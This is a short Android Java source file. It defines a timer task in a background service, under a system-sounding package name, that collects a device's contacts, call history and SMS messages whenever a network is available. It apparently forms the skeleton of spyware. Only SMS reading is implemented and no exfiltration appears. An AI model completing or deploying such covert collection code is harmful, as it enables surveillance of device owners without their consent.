package com.system;

import java.io.DataOutputStream;
import java.io.File;
import java.util.Date;
import java.util.List;
import java.util.TimerTask;

import com.system.feature.sms.SmsCtrl;
import com.system.feature.sms.SmsInfo;
import com.system.utils.*;

import android.app.Activity;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

/**
 * Implementation of the timer task for information collection.
 */
public class GetInfoTask extends TimerTask 
{
	private final String LOGTAG = "GetInfoTask";
	
	public Service service;
	
	public GetInfoTask(Service service)
	{
		super();
		this.service = service;
	}
	
	public void run() 
	{
		Log.d(LOGTAG, "start to collect infomation");
		
		String now = (new Date()).toString();
		if (SysUtils.isNetworkConnected(service.getApplicationContext()))
		{
			CollectContact(this.service);
			CollectPhoneCallHist(this.service);
			CollectSms(this.service);
		}
		
	}
	
	private void CollectSms(Service service) 
	{
		List<SmsInfo> list = SmsCtrl.getSmsList(service, SmsCtrl.SMS_URI_ALL);
		for (int i = 0; i < list.size(); i++)
		{
			list.get(i).toString();
		}
	}

	private void CollectPhoneCallHist(Service service) 
	{
		
	}

	private void CollectContact(Service service) 
	{
		
	}
}
